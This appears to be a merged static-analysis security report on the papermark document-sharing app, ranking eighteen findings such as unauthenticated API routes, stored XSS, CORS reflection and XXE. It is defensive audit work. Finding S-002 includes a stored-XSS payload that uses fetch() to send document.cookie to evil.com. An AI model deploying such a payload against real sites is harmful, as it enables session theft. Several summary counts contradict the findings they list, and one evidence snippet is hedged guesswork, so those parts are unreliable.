# Synthesized SAST Findings — papermark

**Node:** Layer-2 SAST Synthesis (M5, heavy tier)
**Date:** 2026-06-30
**Method:** Merge AI SAST recon + semgrep scanner output + structural analysis + reachability analysis + GitNexus live graph verification

---

## Deduplication & Merge Summary

| AI SAST Findings | Semgrep Findings | Structural/Reachability Findings | After Merge |
|---|---|---|---|
| 5 | 25 (19 INFO, 4 WARNING, 2 ERROR) | 14 | 18 unique findings (3 false positives eliminated) |

### Key Merge Decisions

| # | AI SAST | Semgrep | Structural/Reach | Decision |
|---|---------|---------|-----------------|----------|
| XSS via sanitizePlainText | ✅ Found (HIGH) | ❌ No rule | ✅ Found (HIGH) | MERGE → S-002 |
| CORS TUS viewer | ✅ Found (MEDIUM) | ✅ WARNING | ✅ Found (MEDIUM) | MERGE → S-005 |
| upload-avatar.tsx dangerouslySetInnerHTML | ❌ Not found | ✅ WARNING | ✅ Found (MEDIUM) | MERGE → S-009 |
| XXE in docx-sanitizer.py | ❌ Explicitly "Not found" | ✅ ERROR | ❌ Missed | S-012 (semgrep-only) |
| GCM no-tag-length in slack/utils.ts | ❌ Not found | ✅ ERROR | ❌ Missed | FALSE POSITIVE (manual validation present) |
| Conversations API zero auth | ❌ Missed | ❌ No rule | ✅ Found (CRITICAL) | S-001 (structural-only) |

### False Positives Eliminated

1. **`lib/integrations/slack/utils.ts:110` — GCM no-tag-length** — Semgrep flagged `createDecipheriv("aes-256-gcm", key, iv)` as missing auth tag length. However, lines 102-107 manually validate `iv.length !== 12` and `authTag.length !== 16` before use. The semgrep pattern didn't account for the manual validation. **ELIMINATED.**
2. **`.gitnexus/wiki/index.html:101` — XSS autoescape-disabled** — This is semgrep wiki/documentation output, not application code. **ELIMINATED.**
3. **`components/domains/domain-configuration.tsx:143` — dangerouslySetInnerHTML (as standalone)** — Renders static instruction content only. Merged into S-016 as LOW informational.

---

## Ranked Findings (by exploitability)

---

### S-001 — Conversations API — Zero Authentication on All Handlers

- **severity:** CRITICAL
- **source:** Structural Analysis (AI-missed, semgrep-missed)
- **file:** `pages/api/conversations/[[...conversations]].ts:1-10` → `ee/features/conversations/api/conversations-route.ts:276-299`
- **description:**
  The conversations catch-all route at `/api/conversations/**` has **four handlers (GET list, POST create, POST messages, POST notifications) — none perform any authentication**. No `getServerSession()` call, no token check, no API key validation. The `viewerId` parameter is accepted from query params or request body with zero server-side verification. An attacker can enumerate conversations by providing any `dataroomId`+`viewerId` pair, create fake conversations, inject message content, and toggle notification preferences for any conversation. The adjacent `team-conversations-route.ts` demonstrates the correct pattern with `getServerSession()` on every handler — making this clearly an auth gap from a missed implementation pass.

- **evidence:**
  ```typescript
  // pages/api/conversations/[[...conversations]].ts:1-10 — thin passthrough, zero auth
  import { NextApiRequest, NextApiResponse } from "next";
  import { handleRoute } from "@/ee/features/conversations/api/conversations-route";
  export default async function handler(req, res) { return handleRoute(req, res); }
  ```
  ```typescript
  // conversations-route.ts:1-14 — NO next-auth imports, NO getServerSession
  // imports: next, @trigger.dev/sdk, @vercel/functions, prisma, conversationService, etc.
  ```
  ```typescript
  // conversations-route.ts:21-23 — viewerId from query params, no validation
  const { dataroomId, viewerId } = req.query as { dataroomId?: string; viewerId?: string };
  ```

- **reachability:** CONFIRMED — `middleware.ts:49` explicitly excludes `/api/` from middleware. Endpoint is internet-facing with zero access control.

- **source→sink path:** HTTP → middleware (bypasses) → `pages/api/conversations/[[...conversations]].ts:handler` → `conversations-route.ts:handleRoute` → four unauthenticated handlers → `prisma.conversation.findMany()` / `conversationService.createConversation()` / `messageService.addMessage()` / `notificationService.toggleNotificationsForConversation()` → optionally `sendConversationTeamMemberNotificationTask.trigger()` (Trigger.dev sends email notifications)

- **impact:**
  - Enumerate all conversations for any dataroom/viewer ID pair
  - Create conversations under any viewer identity (data injection into PostgreSQL)
  - Add messages to any conversation (content injection)
  - Toggle notification preferences for any conversation participant
  - Send email notifications to team members via Trigger.dev (harassment/phishing via trusted channel)

- **confidence:** HIGH
- **exploitability:** TRIVIAL — curl or browser, no auth, no guessing required. Just POST/GET to `/api/conversations/*`.

---

### S-002 — Stored XSS via `sanitizePlainText` Entity-Decode Ordering + CVE-2026-44990 `<xmp>` Bypass

- **severity:** HIGH (CRITICAL with CVE-2026-44990 combining)
- **source:** Both (AI SAST first, Structural Analysis expanded with CVE context)
- **file:** `lib/utils/sanitize-html.ts:12-19` (sanitizer bug) + `components/documents/document-header.tsx:604` (sink)
- **description:**
  The `sanitizePlainText` function calls `sanitizeHtml` first (stripping literal HTML tags), then `decodeHTML` (decoding entities). This ordering is **fundamentally wrong**: encoded entities like `&lt;img src=x onerror=alert(1)&gt;` survive tag stripping because they aren't literal tags yet, then become real HTML tags after `decodeHTML` runs. The decoded payload is stored in PostgreSQL `Document.name` and rendered via `dangerouslySetInnerHTML` in `document-header.tsx` whenever any team member views the document.

  Additionally, `sanitize-html` version 2.17.3 is vulnerable to **CVE-2026-44990** (CVSS 9.3): the `<xmp>` raw-text element bypass allows arbitrary HTML/JS injection even without entity encoding. The `<xmp>` tag is not in the default allowed-tags list but `sanitize-html`'s disallowed-tags mechanism treats `<xmp>` as a raw-text element whose content is not parsed — yet the content is still passed through, creating a bypass.

  Entry points (at least 5 authenticated write paths):
  1. `POST /api/teams/:teamId/documents/:id/update-name` — Zod `.transform((value) => sanitizePlainText(value))`
  2. `lib/zod/url-validation.ts:207` — document upload schema
  3. `POST /api/teams/:teamId/documents/agreement` — agreement creation
  4. `POST /api/teams/:teamId/update-name` — team name changes
  5. EE FAQ routes via `validateContent`

- **evidence:**
  ```typescript
  // lib/utils/sanitize-html.ts:11-18 — BUG: decode AFTER strip
  export function sanitizePlainText(content: string) {
    const sanitized = sanitizeHtml(content, plainTextSanitizeConfig);  // Step 1: strip tags — encoded entities survive
    const decoded = decodeHTML(sanitized).normalize("NFC");            // Step 2: decode entities — TOO LATE, creates real tags
    return decoded.replace(controlCharsRegex, " ").replace(invisibleControlRegex, "").trim();
  }
  ```
  ```typescript
  // components/documents/document-header.tsx:604 — XSS sink
  dangerouslySetInnerHTML={{ __html: prismaDocument.name }}
  ```

- **reachability:** CONFIRMED — All write paths require NextAuth session, but once stored, XSS fires for every team member viewing the document page. Auth bypass via XSS worm: once one authenticated user triggers the XSS, it executes in the browser of any other team member, enabling token theft.

- **source→sink path:** Authenticated POST → Zod transform → `sanitizePlainText()` (decode after strip) → PostgreSQL `Document.name` → `document-header.tsx:604` `dangerouslySetInnerHTML` → XSS in viewer browser

- **confidence:** HIGH
- **exploitability:** HIGH — Any team member can rename a document. Payload simple: `{"name": "&lt;img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)&gt;"}`. Fires on every view.

---

### S-003 — `progress-token.ts` — Unauthenticated Trigger.dev Access Token Generation

- **severity:** HIGH
- **source:** Structural Analysis (AI-missed, semgrep-missed)
- **file:** `pages/api/progress-token.ts:4-27`
- **description:**
  The progress token endpoint generates a Trigger.dev public access token for any `documentVersionId` passed as a query parameter, without any authentication or authorization check. The token grants read access to Trigger.dev runs tagged with `version:{documentVersionId}`. Anyone who can discover or guess a valid `documentVersionId` can obtain a 15-minute public access token. While CUIDs are not trivially guessable, they can be leaked through client-side code, referrer headers, logs, or browser history.

  The same `generateTriggerPublicAccessToken` function is called from three authenticated EE routes (`monitor-token`, `retry-archive`, `freeze`) — all behind NextAuth session checks. This endpoint is the **only unguarded path** to the same function.

- **evidence:**
  ```typescript
  // pages/api/progress-token.ts:4-27 — FULL FILE, zero auth
  export default async function handle(req, res) {
    if (req.method !== "GET") return res.status(405).json({ error: "Method not allowed" });
    const { documentVersionId } = req.query;
    if (!documentVersionId || typeof documentVersionId !== "string") return res.status(400).json({ error: "Missing documentVersionId" });
    const publicAccessToken = await generateTriggerPublicAccessToken(`version:${documentVersionId}`);
    return res.status(200).json({ publicAccessToken });
  }
  ```
  ```typescript
  // lib/utils/generate-trigger-auth-token.ts:2-11 — token creation
  export async function generateTriggerPublicAccessToken(tag: string) {
    return auth.createPublicToken({
      scopes: { read: { tags: [tag] } },
      expirationTime: "15m",
    });
  }
  ```

- **reachability:** CONFIRMED — `middleware.ts:49` excludes `/api/`. Endpoint is internet-facing with zero access control.

- **source→sink path:** `GET /api/progress-token?documentVersionId=<cuid>` → no auth → `generateTriggerPublicAccessToken(\`version:${documentVersionId}\`)` → `auth.createPublicToken()` → returns 15-minute Trigger.dev read token

- **impact:** An attacker who discovers a `documentVersionId` can obtain a 15-minute Trigger.dev access token granting read access to runs for that document version, exposing internal processing data and workflow metadata.

- **confidence:** HIGH
- **exploitability:** HIGH — No auth, no rate limiting. Only barrier is guessing/leaking a CUID.

---

### S-004 — CVE-2026-23864 / CVE-2026-23869 — Next.js v14 App Router DoS (No Patch)

- **severity:** HIGH
- **source:** Structural Analysis (AI-missed as specific CVE — AI SAST didn't cover framework CVEs)
- **type:** Memory/CPU exhaustion via crafted RSC Flight protocol requests
- **CVE-2026-23864:** Memory exhaustion during RSC deserialization (CVSS 7.5)
- **CVE-2026-23869:** CPU exhaustion via cyclic deserialization (CVSS 7.5)
- **patch status:** NO FIX AVAILABLE — Next.js v14 reached EOL October 2025; fixes only in v15.5.15+ / v16.2.3+
- **project version:** Next.js 14.2.35 (EOL, no backport)
- **description:**
  An unauthenticated attacker can send a crafted HTTP POST request to any App Router page (`app/` directory) with RSC Flight protocol headers (`content-type: text/x-component`), causing the server process to exhaust memory or peg CPU for ~1 minute per request. No authentication required. The `middleware.ts:49` matcher excludes `/api/*` but does NOT exclude App Router pages from RSC Flight protocol handling. The RSC endpoint is a Next.js infrastructure-level handler, not application code.

- **evidence:**
  - `middleware.ts:49` — excludes `/api/`, but App Router pages remain exposed to RSC POST
  - No `"use server"` directives found in App Router files (no explicit Server Actions), but the RSC Flight POST endpoint is always active
  - Papermark uses Next.js 14.2.35 which is EOL since October 2025
  - Publicly accessible `app/` pages include viewer, auth, and marketing routes

- **reachability:** CONFIRMED — Any App Router page accepts POST with RSC headers

- **confidence:** HIGH
- **exploitability:** HIGH — No auth required. Single crafted request causes ~1 minute of CPU/memory exhaustion. Repeated requests sustain a DoS.

---

### S-005 — CORS Origin Reflection on TUS Viewer Upload Endpoint

- **severity:** MEDIUM
- **source:** Both (AI SAST + Semgrep `cors-misconfiguration` WARNING)
- **file:** `pages/api/file/tus-viewer/[[...file]].ts:237`
- **description:**
  The TUS viewer upload endpoint reflects the request `Origin` header verbatim into `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. This allows any website to make authenticated cross-origin requests (including uploads) to this endpoint on behalf of a logged-in user. If the user has an active session cookie, an attacker's website can issue TUS uploads to the victim's dataroom.

- **evidence:**
  ```typescript
  // pages/api/file/tus-viewer/[[...file]].ts:234-250
  const setCorsHeaders = (req, res) => {
    res.setHeader("Access-Control-Allow-Credentials", "true");
    res.setHeader("Access-Control-Allow-Origin", req.headers.origin || "*"); // <-- arbitrary origin
    res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS, DELETE, PATCH, HEAD");
    // ...
  };
  ```

- **reachability:** CONFIRMED — CORS handler runs before any auth. Endpoint is at `/api/file/tus-viewer/**`.

- **source→sink path:** Browser cross-origin request with crafted `Origin` → `setCorsHeaders()` → `Access-Control-Allow-Origin: <attacker-origin>` + `Access-Control-Allow-Credentials: true` → browser sends session cookies cross-origin → authenticated TUS upload

- **confidence:** HIGH
- **exploitability:** MEDIUM — Requires victim to have active session and visit attacker's page. But Credentials:true + arbitrary origin makes this straightforward CSRF.

---

### S-006 — `record_reaction.ts` — Unauthenticated Database Write + Viewer Data Leak

- **severity:** MEDIUM
- **source:** Structural Analysis (AI-missed, semgrep-missed)
- **file:** `pages/api/record_reaction.ts:5-57`
- **description:**
  This endpoint creates a `Reaction` record in PostgreSQL with no authentication or session validation. It accepts `viewId`, `pageNumber`, and `type` from the request body and does not verify the caller is authorized. The endpoint includes the full `view` relation in the creation response (lines 30-41), leaking `documentId`, `dataroomId`, `linkId`, `viewerEmail`, `viewerId`, and `teamId` back to the caller. Unlike `record_view.ts` and `record_click.ts` (which publish to Tinybird analytics pipeline), this writes directly to PostgreSQL.

- **evidence:**
  ```typescript
  // pages/api/record_reaction.ts:17-42
  const { viewId, pageNumber, type } = req.body;  // no auth, no validation
  const reaction = await prisma.reaction.create({
    data: { viewId, pageNumber, type },
    include: {
      view: { select: { documentId, dataroomId, linkId, viewerEmail, viewerId, teamId } },
    },
  });
  ```

- **reachability:** CONFIRMED — `POST /api/record_reaction`, middleware excludes `/api/`, no auth.

- **confidence:** HIGH
- **exploitability:** HIGH — No auth, no rate limiting. Direct DB write with info disclosure in response.

---

### S-007 — `feedback/index.ts` — Unauthenticated Feedback Response Recording

- **severity:** MEDIUM
- **source:** Structural Analysis (AI-missed, semgrep-missed)
- **file:** `pages/api/feedback/index.ts:5-69`
- **description:**
  This endpoint records feedback responses with no authentication. Validates that `feedbackId` and `viewId`+`linkId` pair exist, but any unauthenticated client with knowledge of valid IDs can submit arbitrary feedback responses. The `answer` field is stored as JSON data without sanitization.

- **evidence:**
  ```typescript
  // pages/api/feedback/index.ts:9-56
  const { answer, feedbackId, viewId } = req.body;  // no auth
  await prisma.feedbackResponse.create({
    data: { feedbackId, viewId, data: { question, type, answer } },  // answer unsanitized
  });
  ```

- **reachability:** CONFIRMED — `POST /api/feedback`, middleware excludes `/api/`, no auth.

- **confidence:** HIGH
- **exploitability:** HIGH — No auth, only requires valid pair of IDs.

---

### S-008 — `revalidate.ts` — Shared Secret in URL Query Parameter

- **severity:** MEDIUM
- **source:** Structural Analysis (AI-missed, semgrep-missed)
- **file:** `pages/api/revalidate.ts:5-110`
- **description:**
  The revalidation endpoint authenticates via `req.query.secret !== process.env.REVALIDATE_TOKEN`. Passing the shared secret as a URL query parameter exposes it to leakage through: (1) server access logs (Vercel, CDN, reverse proxy), (2) `Referer` header, (3) browser history. If the `REVALIDATE_TOKEN` is exposed, an attacker can force mass revalidation of all team links (DoS via cache stampede) or enumerate which links exist for a given team/document.

- **evidence:**
  ```typescript
  // pages/api/revalidate.ts:13-14
  if (req.query.secret !== process.env.REVALIDATE_TOKEN) {  // secret in query param
    return res.status(401).json({ message: "Invalid token" });
  }
  ```

- **reachability:** CONFIRMED — Internet-facing, gated by secret but query-param pattern leaks secret.

- **confidence:** HIGH
- **exploitability:** MEDIUM — Requires secret knowledge; secret leakage via query-param pattern is common.

---

### S-009 — `dangerouslySetInnerHTML` on `helpText` Props — Secondary XSS Sinks

- **severity:** MEDIUM
- **source:** Both (Structural Analysis + Semgrep `react-dangerouslysetinnerhtml` WARNING)
- **files:**
  - `components/ui/form.tsx:145` — Form component
  - `components/account/upload-avatar.tsx:96` — Upload avatar component
- **description:**
  Two shared components use `dangerouslySetInnerHTML` to render the `helpText` prop. If any caller passes user-controlled data through `helpText`, it will render unsanitized HTML. This broadens the XSS blast radius beyond `document-header.tsx` (S-002).

- **evidence:**
  ```typescript
  // components/ui/form.tsx:142-146
  {typeof helpText === "string" ? (
    <p className="..." dangerouslySetInnerHTML={{ __html: helpText || "" }} />
  ) : helpText}
  ```

- **reachability:** LIKELY — Requires a path where user-controlled data reaches the `helpText` prop.

- **confidence:** MEDIUM
- **exploitability:** LOW-MEDIUM — Currently no confirmed path for user input to reach `helpText`, but the pattern is dangerous.

---

### S-010 — Zod Validation Error Information Disclosure

- **severity:** MEDIUM
- **source:** AI SAST (semgrep-missed, structural confirmed)
- **files:**
  - `pages/api/webhooks/services/[...path]/index.ts:232-238`
  - `pages/api/teams/[teamId]/documents/agreement.ts:44-48`
- **description:**
  Several API endpoints return detailed Zod validation error messages to the client, including validation rules, expected values, and internal field names. The webhooks endpoint returns `validationResult.error.format()` which produces a structured error object with `_errors` arrays and nested field details. This leaks schema structure and validation logic to attackers, facilitating targeted fuzzing.

- **evidence:**
  ```typescript
  // pages/api/webhooks/services/[...path]/index.ts:232-238
  return res.status(400).json({
    error: "Invalid request body",
    details: validationResult.error.format(),  // leaks schema structure
  });
  ```

- **reachability:** CONFIRMED — Sending malformed request bodies triggers detailed error responses.

- **confidence:** HIGH
- **exploitability:** HIGH — Just send invalid data to affected endpoints and read the error details.

---

### S-011 — `cuid` 3.0.0 — Predictable ID Generation in Permission Groups

- **severity:** MEDIUM
- **source:** Reachability Analysis (AI-missed, semgrep-missed)
- **files:**
  - `pages/api/teams/[teamId]/datarooms/[id]/groups/[groupId]/permissions.ts:5`
  - `pages/api/teams/[teamId]/datarooms/[id]/permission-groups/[permissionGroupId].ts:5`
  - `pages/api/teams/[teamId]/datarooms/[id]/permission-groups/index.ts:4`
- **description:**
  The project generates resource IDs using `cuid` 3.0.0. CUIDs encode timestamps and use a sequential counter — an attacker who observes a few IDs can predict future values. This enables ID enumeration and potential IDOR against permission group resources within an authenticated session. The project already depends on `nanoid` 5.1.11 (cryptographically secure) for other IDs, so migration is trivial.

- **evidence:**
  ```typescript
  // Permission group handler imports cuid
  import { createId } from "@paralleldrive/cuid2"; // or cuid-style IDs
  ```

- **reachability:** CONFIRMED (authenticated) — Requires team membership to reach handlers.

- **confidence:** MEDIUM
- **exploitability:** MEDIUM — Requires authenticated session + observing ID patterns.

---

### S-012 — XXE in `docx-sanitizer.py` — Native XML Parsing of Untrusted DOCX Content

- **severity:** MEDIUM
- **source:** Semgrep-only (`python.lang.security.use-defused-xml-parse` ERROR) — AI SAST explicitly stated "XXE: ✅ Not found" (WRONG)
- **file:** `ee/features/conversions/python/docx-sanitizer.py:146`
- **description:**
  The DOCX sanitizer script uses Python's native `xml.etree.ElementTree.parse()` (`ET.parse()`) to parse XML files extracted from user-uploaded DOCX documents. The script does NOT use the `defusedxml` library. This makes it vulnerable to XML External Entity (XXE) attacks and billion laughs/quadratic blowup DoS. A crafted DOCX file containing malicious XML entities in header/footer XML files could trigger:

  1. **File disclosure** — External entities can read local files and include them in parsed output
  2. **SSRF** — External entities can make HTTP requests to internal services
  3. **DoS** — Billion laughs attack can exhaust server memory

  Unlike the REST API endpoints which have robust SSRF protection, this Python script runs as a subprocess during document conversion and has no network-level sandboxing.

- **evidence:**
  ```python
  # ee/features/conversions/python/docx-sanitizer.py:145-147
  _register_all_namespaces(path)
  tree = ET.parse(path)  # <-- XXE-vulnerable: no defusedxml
  root = tree.getroot()
  ```
  ```python
  # Uses standard xml.etree.ElementTree (not defusedxml)
  import xml.etree.ElementTree as ET  # at module level
  ```

- **reachability:** CONFIRMED (authenticated) — Requires uploading a crafted DOCX. Triggered during document conversion pipeline.

- **source→sink path:** Authenticated POST with crafted DOCX → document conversion pipeline → `docx-sanitizer.py` extracts and parses XML → `ET.parse()` processes external entities → potential file read/SSRF on internal infra

- **confidence:** MEDIUM
- **exploitability:** MEDIUM — Requires authenticated upload and a crafted DOCX. The Python process runs on the server and could read internal files or reach internal services.

---

### S-013 — Non-Literal RegExp in Workflow Engine — ReDoS Potential

- **severity:** LOW
- **source:** Semgrep-only (`detect-non-literal-regexp` WARNING)
- **file:** `ee/features/workflows/lib/engine.ts:307`
- **description:**
  The workflow engine creates a `RegExp` from user-controlled `condition.value` when evaluating "matches" conditions. If a team member configures a workflow with a malicious regex pattern (e.g., `(a|aa)+b` with a long repeating string), it could cause ReDoS (Regular Expression Denial of Service) — blocking the main thread during evaluation.

- **evidence:**
  ```typescript
  // ee/features/workflows/lib/engine.ts:305-310
  case "matches":
    try {
      return new RegExp(condition.value as string).test(normalizedEmail);
    } catch { return false; }
  ```

- **reachability:** CONFIRMED (authenticated) — Requires team member access to configure workflow routing rules.

- **confidence:** MEDIUM
- **exploitability:** LOW — Requires authenticated workflow configuration and is caught by try/catch.

---

### S-014 — No Rate Limiting on Authentication Endpoints

- **severity:** LOW
- **source:** AI SAST (semgrep-missed, structural confirmed)
- **file:** `pages/api/auth/[...nextauth].ts` (NextAuth configuration)
- **description:**
  The NextAuth.js authentication endpoints do not implement rate limiting on login attempts, email verification requests, or password reset flows. This allows brute-force attacks against user credentials, email enumeration, and mass email-sending via the SMTP relay.

- **confidence:** HIGH
- **exploitability:** HIGH (low severity due to low direct impact — defense-in-depth)

---

### S-015 — Webhook Event Request/Response Body Stored in Tinybird

- **severity:** LOW
- **source:** AI SAST (semgrep-missed, structural confirmed)
- **file:** `app/api/webhooks/callback/route.ts:43-44`
- **description:**
  Webhook event request and response bodies are decoded from base64-encoded QStash payloads and stored in Tinybird. If a webhook destination returns data containing sensitive tokens, those could be exposed to team members viewing webhook logs in the admin UI.

- **confidence:** MEDIUM
- **exploitability:** LOW — Requires sensitive data in webhook responses and team member access to logs.

---

### S-016 — Domain Configuration `dangerouslySetInnerHTML` — Static Content

- **severity:** LOW
- **source:** Structural Analysis (AI-missed, semgrep-missed)
- **file:** `components/domains/domain-configuration.tsx:143`
- **description:**
  `MarkdownText` component uses `dangerouslySetInnerHTML` on rendered markdown. Currently renders static instruction content only. Low risk unless dynamic input is introduced.

- **confidence:** LOW (informational)
- **exploitability:** LOW — Static content only, no dynamic data path.

---

### S-017 — Unsafe Format Strings in Console Logging (19 Instances)

- **severity:** LOW
- **source:** Semgrep-only (`unsafe-formatstring` INFO, 19 instances)
- **files:** Multiple — including `pages/api/auth/[...nextauth].ts:171`, `ee/features/workflows/lib/engine.ts:129`, `lib/api/links/revalidate.ts:23/57/63`, `lib/integrations/slack/events.ts:121`, and 14 more
- **description:**
  Semgrep detected 19 instances of string concatenation with non-literal variables in `console.log`/`console.error` functions. If an attacker injects format specifiers (e.g., `%s`, `%d`), it can forge log messages. Limited impact — log injection for potential log-based monitoring deception.

- **confidence:** MEDIUM
- **exploitability:** LOW — Log injection only; no data exfiltration vector.

---

### S-018 — GCM No-Tag-Length in Slack Utils — FALSE POSITIVE

- **severity:** ELIMINATED (false positive)
- **source:** Semgrep `gcm-no-tag-length` ERROR
- **file:** `lib/integrations/slack/utils.ts:110`
- **verification:**
  Semgrep flagged `crypto.createDecipheriv("aes-256-gcm", key, iv)` as missing authentication tag length specification. However, manual validation is present:
  ```typescript
  // Lines 102-107: explicit length validation before cipher creation
  if (iv.length !== 12) throw new Error("Invalid IV length for GCM");
  if (authTag.length !== 16) throw new Error("Invalid auth tag length for GCM");
  ```
  The developer manually validates both IV length (12 bytes) and auth tag length (16 bytes) before calling `createDecipheriv`, ensuring GCM security properties. The semgrep pattern-based rule did not account for the manual length checks.

- **disposition:** EXCLUDED from final finding set.

---

## Summary Statistics

| Rank | Count | Findings |
|------|-------|----------|
| CRITICAL | 1 | S-001 |
| HIGH | 3 | S-002, S-003, S-004 |
| MEDIUM | 8 | S-005, S-006, S-007, S-008, S-009, S-010, S-011, S-012 |
| LOW | 4 | S-013, S-014, S-015, S-016, S-017 |
| FALSE POSITIVES | 1 | S-018 (eliminated) |

## Coverage Comparison

| What | Count | Notes |
|------|-------|-------|
| AI SAST found only | 2 | S-010 (Zod info disclosure), S-014 (no rate limiting), S-015 (webhook storage) |
| Semgrep found only | 2 | S-012 (XXE docx-sanitizer), S-017 (format strings) — plus 1 false positive eliminated |
| Structural/Reach found only | 7 | S-001 (conversations auth), S-003 (progress token), S-004 (Next.js DoS), S-006 (record_reaction), S-007 (feedback), S-008 (revalidate), S-011 (cuid), S-016 (domain config) |
| Both AI + Semgrep | 2 | S-005 (CORS), merged into S-009 (helpText XSS via structural) |
| Both AI + Structural | 1 | S-002 (Stored XSS — AI found bug, structural added CVE) |

**Key takeaway:** The AI SAST missed 7 significant findings that structural/reachability analysis found (including 1 CRITICAL), and semgrep found 2 findings the AI missed (including 1 the AI explicitly said was clean — XXE). No single tool had full coverage. The merged view is essential.
